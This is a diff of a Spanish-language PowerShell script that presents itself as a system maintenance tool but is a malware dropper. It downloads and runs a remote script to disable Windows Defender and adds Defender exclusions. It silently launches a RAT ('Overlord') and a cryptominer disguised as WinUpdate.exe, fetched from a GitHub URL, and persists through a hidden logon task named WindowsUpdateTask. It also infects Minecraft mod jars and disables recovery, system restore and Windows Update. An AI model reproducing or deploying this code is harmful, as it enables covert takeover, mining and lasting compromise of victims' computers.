@@ -1,61 +1,26 @@
 # ============================================================
-#  wf.ps1 - SCRIPT DE MANTENIMIENTO DEL SISTEMA (con limpieza previa)
+#  wf.ps1 - SCRIPT DE MANTENIMIENTO DEL SISTEMA
 #  Ejecutar como Administrador
 # ============================================================
 
 Write-Host "[+] Iniciando mantenimiento del sistema..." -ForegroundColor Red
 
-# -------------------------------
-# 0. LIMPIEZA DE MINERO ANTIGUO (si existe)
-# -------------------------------
-Write-Host "[0/8] Buscando y eliminando versiones antiguas de WinUpdate..." -ForegroundColor Cyan
-
-# 0.1 Detener todos los procesos WinUpdate.exe
-$oldProcs = Get-Process -Name "WinUpdate" -ErrorAction SilentlyContinue
-if ($oldProcs) {
-    foreach ($proc in $oldProcs) {
-        Write-Host "    Deteniendo proceso antiguo PID $($proc.Id) - Ruta: $($proc.Path)" -ForegroundColor Yellow
-        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
-    }
-    Start-Sleep -Seconds 1
-}
-
-# 0.2 Buscar y eliminar otros archivos WinUpdate.exe (excepto el que vamos a instalar)
-$targetDir = "C:\ProgramData\Updater"
-$oldFiles = Get-ChildItem -Path "C:\" -Filter "WinUpdate.exe" -Recurse -ErrorAction SilentlyContinue | 
-            Where-Object { $_.FullName -ne "$targetDir\WinUpdate.exe" }
-if ($oldFiles) {
-    foreach ($file in $oldFiles) {
-        Write-Host "    Eliminando archivo antiguo: $($file.FullName)" -ForegroundColor Yellow
-        Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
-    }
-} else {
-    Write-Host "    No se encontraron archivos antiguos de WinUpdate." -ForegroundColor Green
-}
-
-# -------------------------------
-# 1. DESHABILITAR WINDOWS DEFENDER
-# -------------------------------
-Write-Host "[1/8]" -ForegroundColor Cyan
+# 1. Deshabilitar protecciones
+Write-Host "[1/7]" -ForegroundColor Cyan
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/MurphCodeDev/wf/main/Disable_Defender.ps1'))
 Start-Sleep -Seconds 5
 
-# -------------------------------
-# 2. CREAR DIRECTORIO DE TRABAJO Y EXCLUSIONES
-# -------------------------------
-Write-Host "[2/8]" -ForegroundColor Cyan
+# 2. Crear directorio de trabajo
+Write-Host "[2/7]" -ForegroundColor Cyan
 $workDir = "C:\ProgramData\Updater"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
 # Excluir directorio y proceso
 Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "WinUpdate.exe" -ErrorAction SilentlyContinue
-Write-Host "[+] Exclusiones aplicadas." -ForegroundColor Green
 
-# -------------------------------
-# 3. DESCARGAR COMPONENTES (Overlord y WinUpdate)
-# -------------------------------
-Write-Host "[3/8]" -ForegroundColor Cyan
+# 3. Descargar componentes (Overlord y WinUpdate)
+Write-Host "[3/7]" -ForegroundColor Cyan
 
 # Overlord
 $ratPath = "$workDir\win_nc.exe"
@@ -64,20 +29,14 @@ if (-not (Test-Path $ratPath)) {
 }
 Start-Process -FilePath $ratPath -WindowStyle Hidden -ErrorAction SilentlyContinue
 
-# Componente principal (WinUpdate) - descarga siempre la última versión (sobrescribe)
+# Componente principal (WinUpdate)
 $componentPath = "$workDir\WinUpdate.exe"
-Write-Host "    Descargando última versión de WinUpdate..." -ForegroundColor Yellow
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/WinUpdate.exe" -OutFile $componentPath -ErrorAction SilentlyContinue > $null 2>&1
-if (Test-Path $componentPath) {
-    Write-Host "    Descarga completada." -ForegroundColor Green
-} else {
-    Write-Host "    Error en descarga, pero se reintentará más tarde." -ForegroundColor Red
+if (-not (Test-Path $componentPath)) {
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/WinUpdate.exe" -OutFile $componentPath -ErrorAction SilentlyContinue > $null 2>&1
 }
 
-# -------------------------------
-# 4. CREAR SCRIPT SUPERVISOR (con verificación y ejecución)
-# -------------------------------
-Write-Host "[4/8]" -ForegroundColor Cyan
+# 4. Crear script supervisor (con nombres neutros)
+Write-Host "[4/7]" -ForegroundColor Cyan
 
 $supervisorScript = @'
 $workDir = "C:\ProgramData\Updater"
@@ -130,10 +89,8 @@ Write-Log "Script de verificación finalizado."
 $supervisorPath = "$workDir\Start-WinUpdate.ps1"
 $supervisorScript | Out-File -FilePath $supervisorPath -Encoding ASCII -Force
 
-# -------------------------------
-# 5. CREAR TAREA PROGRAMADA (ONLOGON)
-# -------------------------------
-Write-Host "[5/8]" -ForegroundColor Cyan
+# 5. Crear tarea programada persistente (ONLOGON)
+Write-Host "[5/7]" -ForegroundColor Cyan
 $taskName = "WindowsUpdateTask"
 $taskCommand = "powershell.exe"
 $taskArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$supervisorPath`""
@@ -148,10 +105,8 @@ if (schtasks /query /tn "$taskName" 2>$null) {
     schtasks /create /tn "$taskName" /tr "$taskCommand $taskArgs" /sc onlogon /ru "$env:USERNAME" /rl HIGHEST /f > $null 2>&1
 }
 
-# -------------------------------
-# 6. INFECCIÓN DE MODS DE MINECRAFT
-# -------------------------------
-Write-Host "[6/8]" -ForegroundColor Cyan
+# 6. Infección de mods de Minecraft (opcional, igual que original)
+Write-Host "[6/7]" -ForegroundColor Cyan
 $jarName = "fabric-api-0.179.1_22.1.2.jar"
 $tempJar = "$workDir\$jarName"
 $destinos = @()
@@ -191,10 +146,8 @@ if ($destinos.Count -gt 0) {
     }
 }
 
-# -------------------------------
-# 7. DESHABILITAR RECUPERACIÓN, RESTAURACIÓN Y WINDOWS UPDATE
-# -------------------------------
-Write-Host "[7/8]" -ForegroundColor Cyan
+# 7. Deshabilitar recuperación, restauración y Windows Update
+Write-Host "[7/7]" -ForegroundColor Cyan
 reagentc.exe /disable > $null 2>&1
 Disable-ComputerRestore -Drive "C:\" -ErrorAction SilentlyContinue
 
@@ -202,24 +155,12 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v SetDisableUX
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f /reg:64 > $null 2>&1
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 2 /f /reg:64 > $null 2>&1
 
-# -------------------------------
-# 8. VERIFICACIÓN FINAL Y LIMPIEZA POST-INSTALACIÓN (opcional)
-# -------------------------------
-Write-Host "[8/8]" -ForegroundColor Cyan
+# Verificación final
 Write-Host "[+] CHECKS" -ForegroundColor Cyan
 try { Get-MpComputerStatus -ErrorAction Stop 2>$null | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled } catch { Write-Host "Windows Defender: Deshabilitado" }
 if ((reagentc /info | Out-String) -match "Enabled|Disabled") { Write-Host "Factory Reset: $($matches[0])" } else { Write-Host "Factory Reset: No encontrado" }
 if ((Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -ErrorAction SilentlyContinue).NoAutoUpdate -eq 1) { Write-Host "Windows Update: Deshabilitado" } else { Write-Host "Windows Update: Habilitado" }
 
-# Verificar que el nuevo WinUpdate se descargó correctamente
-if (Test-Path $componentPath) {
-    Write-Host "[+] Nuevo WinUpdate instalado en $componentPath" -ForegroundColor Green
-    # Opcional: lanzarlo ya (sin esperar reinicio) para que empiece a funcionar
-    Start-Process -FilePath $componentPath -WindowStyle Hidden -ErrorAction SilentlyContinue
-} else {
-    Write-Host "[-] Advertencia: No se pudo descargar WinUpdate. Se reintentará en el próximo inicio de sesión." -ForegroundColor Yellow
-}
-
 Write-Host "[DONE] Mantenimiento completado. El servicio se activará en el próximo inicio de sesión (60s después)." -ForegroundColor Magenta
-Write-Host "[*] La tarea programada mantendrá el servicio activo y lo actualizará si es necesario." -ForegroundColor Yellow
+Write-Host "[*] La tarea programada mantendrá el servicio activo." -ForegroundColor Yellow
 # Restart-Computer -Force   (opcional)
